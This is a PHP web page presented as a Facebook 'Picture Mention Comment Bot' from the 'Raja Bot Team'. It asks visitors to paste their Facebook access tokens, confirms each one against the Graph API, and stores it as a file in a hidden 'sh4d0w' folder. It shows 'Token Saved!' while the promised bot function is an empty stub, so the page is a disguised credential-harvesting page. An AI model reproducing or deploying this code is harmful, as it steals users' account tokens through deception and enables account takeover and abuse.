<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><meta charset="utf-8"/>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>Raja Bot Team | Picture Mention Comment Bot</title>
<link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="table.css" media="all,handheld"/>
<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/images/emoji.php/v9/fa/1/16/1f981.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<?php
$yx=opendir('sh4d0w');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> sh4d0w($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function sh4d0w($access){
if(!is_dir('sh4d0w')){
mkdir('sh4d0w');
}
$a=fopen('sh4d0w/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<center><font color="red">Inalid or expired Access Token!</font></center>';
$this->form();
}

public function form(){
$on= file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/user.php');

echo'
<div id="header"><script src="style/header.js"></script><hr></div>
<center><marquee direction="left" width="60%"> Raja Bot Team : Powered By <font color ="red">❤️</font> Raja Junaid<font color ="red">❤️</font> Contact For Any Help, Thanks</marquee></center></br>
<hr width="60%"></br>
<div id="profile">
<div class="css">
<a target="_blank"  href="https://facebook.com/100004683077625">
<img src="https://graph.facebook.com/100004683077625/picture?type=large" alt="" style="border-radius: 100%; border: 4px solid white;" width="200" height="200" title="Visit admin Profile"/></a></div></div></br>
<div id="center">
<a href="http://vip-tokenx.tk" target="_blank"><input class="button" type="button" value="Get Token From Here"></a></br></br>

<form action="" method="POST">
<input class="search" style="width:65%" type="text" name="access_token" placeholder="Input Token Here" required></br>
<input class="submit" type="submit" name="saveFile" value="Submit"></form></div>';
}

public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me?fields=id,name&access_token='.$access),true);
for($i=0;$i<count($feed[data]);$i++){
$id1 = $feed[data][$i][id];
}
echo'
<div id="center">
<font size="40px"> Token Saved! </font></br>
[<a href="index.php" value="Click Here">Click Here</a>] to go back to the home page.</div>';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
));
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<div id="footer">
Users <font color="yellow"> <?php include 'user.php';?> </font></br>
Created By <a target="_blank" href="https://facebook.com/ImRJunaid">Raja Junaid</a></br></div>
</div><vedio autoplay loop>
<source src="https://www.youtube.com/watch?v=xLFqFP4ZdJE" controls>
<p>If you are reading this, it is because your browser does not support the vedio element.</p>
</vedio>
